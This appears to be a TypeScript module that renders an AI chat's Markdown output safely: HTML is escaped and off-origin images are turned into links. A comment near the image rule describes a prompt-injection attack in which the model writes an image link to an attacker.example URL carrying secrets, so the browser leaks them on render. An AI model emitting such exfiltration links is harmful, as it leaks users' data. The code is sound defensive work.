import MarkdownIt from "markdown-it";

// HTML in model output is escaped, never rendered: the model can't inject markup.
const md = new MarkdownIt({ html: false, linkify: true, breaks: false, typographer: false });

const defaultLink = md.renderer.rules.link_open ?? ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options));
md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  tokens[idx]!.attrSet("target", "_blank");
  tokens[idx]!.attrSet("rel", "noopener noreferrer");
  return defaultLink(tokens, idx, options, env, self);
};

// Images load only from the page's own origin (or a data: URL, which loads nothing). Otherwise a
// prompt injection could make the model write ![](https://attacker.example/?q=<secrets>) and the
// browser would send the data the moment the message renders. Other images become links: a click.
const defaultImage = md.renderer.rules.image!;
md.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]!;
  const src = token.attrGet("src") ?? "";
  if (loadsFromPage(src)) return defaultImage(tokens, idx, options, env, self);
  const alt = self.renderInlineAsText(token.children ?? [], options, env);
  const href = md.utils.escapeHtml(src);
  return `<a href="${href}" target="_blank" rel="noopener noreferrer">${md.utils.escapeHtml(alt) || href}</a>`;
};

function loadsFromPage(src: string): boolean {
  const page = globalThis.location?.href ?? "http://localhost/";
  try {
    const url = new URL(src, page);
    return url.protocol === "data:" || url.origin === new URL(page).origin;
  } catch {
    return false;
  }
}

// Wide tables scroll inside their own container instead of stretching the chat.
md.renderer.rules.table_open = () => '<div class="kl-md-table"><table>';
md.renderer.rules.table_close = () => "</table></div>";

export function renderMarkdown(source: string): string {
  return md.render(source);
}
